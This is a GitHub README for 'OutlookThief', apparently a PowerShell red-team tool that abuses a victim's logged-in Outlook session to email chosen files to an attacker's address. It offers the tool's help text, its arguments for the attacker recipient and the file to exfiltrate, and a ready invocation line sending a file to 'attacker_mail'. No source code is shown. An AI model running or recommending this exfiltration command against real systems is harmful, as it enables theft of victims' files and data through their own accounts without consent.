
# OutlookThief

![image psd](https://github.com/Zeyad-Azima/OutlookThief/assets/62406753/fd9fd1af-6d06-43e3-8f20-37750866b3b3)


A tool to abuse the current opened session of outlook to exfilitrate data through it.

# Usage
```
[+] OutlookThief
[*] By: Zeyad Azima
[*] Github: https://github.com/Zeyad-Azima/OutlookThief

[*] Help:
The tool simply abuses the logged-in user through outlook to send email that has the targeted data to Exfiltrate it to the attacker side.

[*] Arguments:
  -help            : Display the help message
  -mailTo          : The attacker/recipient email
  -attachmentPath  : The file path to exfiltrate
  -subject         : The email Subject
  -bodyContent     : The email body content
```
### Invoke
```
.\OutlookThief.ps1 -mailTo "attacker_mail" -attachmentPath "file_path" -subject "Subject" -bodyContent "Body Content"
```
